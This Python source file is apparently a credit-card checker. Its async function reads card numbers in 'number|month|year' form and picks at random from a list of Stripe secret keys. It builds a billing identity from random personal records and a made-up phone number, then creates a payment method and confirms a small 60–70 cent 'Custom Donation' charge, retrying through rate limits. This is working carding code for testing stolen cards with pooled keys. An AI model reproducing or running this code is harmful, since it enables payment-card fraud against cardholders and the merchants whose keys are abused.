import traceback
import random , uuid
async def create_charge(fullcc , sks , session,all_data,mode):
    try:
        max_amt = 0
        max_retry = 200
        sk = random.choice(sks)
        data = random.choice(all_data)
        fname = data["first_name"]
        lname = data["last_name"]
        email = data["email"]
        zip = data["zip"]
        add1 = data["add1"]
        add2 = data["add2"]
        city = data["city"]
        state = data["state"]
        country = data["country"]
        splitter = fullcc.split("|")
        cc = splitter[0]
        mes = splitter[1]
        ano = splitter[2]
        name = fname + " " + lname
        phone = str(random.randint(220,820)) + str(random.randint(100,999)) +   str(random.randint(1000,9999))
        order_id = random.randint(1000,9999)
        guid = str(uuid.uuid4())
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())
        while True:
            url1 = "https://api.stripe.com/v1/payment_methods"
            headers1 = {
                "Authorization": f"Bearer {sk}",
            }
            data1 = {
                "type":"card",
                "billing_details[name]":f"{fname} {lname}",
                "billing_details[address][city]":city,
                "billing_details[address][country]":"US",
                "billing_details[address][line1]":add1,
                "billing_details[address][postal_code]":zip,
                "billing_details[address][state]":state,
                "card[number]":cc,
                # "card[cvc]":cvv,
                "card[exp_month]":mes,
                "card[exp_year]":ano,
                "guid":guid,
                "muid":muid,
                "sid":sid,
                "payment_user_agent":"stripe.js/fb7ba4c633; stripe-js-v3/fb7ba4c633; split-card-element",
                "time_on_page":random.randint(10021,10090),
                # "key":pk
            }
            result1 = await session.post(url1, headers=headers1, data=data1)
            if max_amt == max_retry and mode == "1":
                return result1.text
            if "Request rate limit exceeded." in result1.text:
                max_amt += 1
                continue
            else:
                break
        try:
            id = result1.json()["id"]
        except:
            return result1.text
        while True:
            url2 = "https://api.stripe.com/v1/payment_intents"
            headers2 = {
                "Authorization": f"Bearer {sk}",
            }
            data2 = f"amount={random.randint(60, 70)}&currency=usd&payment_method_types[]=card&payment_method={id}&confirm=true&off_session=true&use_stripe_sdk=true&description=Custom Donation&receipt_email={email}&metadata[order_id]={order_id}"
            result2 = await session.post(url2, headers=headers2, data=data2)
            if max_amt == max_retry and mode == "1":
                return result2.text
            if "Request rate limit exceeded." in result2.text:
                max_amt += 1
                continue
            else:
                break
        return result2.text

    except Exception as e:
        import traceback
        await error_log(traceback.format_exc())
        return str(e)
    
    